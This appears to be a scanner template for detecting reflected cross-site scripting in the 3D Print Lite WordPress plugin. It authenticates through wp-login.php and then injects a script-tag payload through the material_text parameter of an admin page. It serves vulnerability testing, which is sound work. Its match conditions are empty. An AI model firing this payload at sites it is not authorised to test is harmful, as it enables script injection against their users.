id: 3d-print-lite-xss
brief:
    title: 3D Print Lite < 1.9.1.6 - Reflected Cross-Site Scripting
    by: r3Y3r53
    level: medium
    about: The plugin does not sanitise and escape some user input before outputting it back in attributes, leading to Reflected Cross-Site Scripting issues
    label:
        - 3dprint
        - lite
        - authenticated
        - wpscan
        - xss
        - wordpress
        - wp-plugin
        - wp
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script>'
      signs: []
